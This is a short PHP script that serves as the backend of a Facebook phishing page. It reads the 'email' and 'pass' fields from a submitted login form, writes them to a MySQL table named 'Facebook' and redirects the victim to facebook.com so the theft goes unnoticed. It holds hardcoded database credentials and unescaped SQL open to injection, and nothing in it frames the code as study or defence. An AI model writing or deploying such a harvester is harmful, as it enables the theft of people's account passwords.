<?php 

Header('Location: http://facebook.com');

$con=mysqli_connect("localhost","KyleM","Minshall1!","Site");

if (mysqli_connect_errno()) 
{
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
}

$username = $_POST['email'];
$password = $_POST['pass'];

mysqli_query($con,"INSERT INTO Facebook (Username, Password) VALUES ('$username', '$password')");

mysqli_close($con);

?>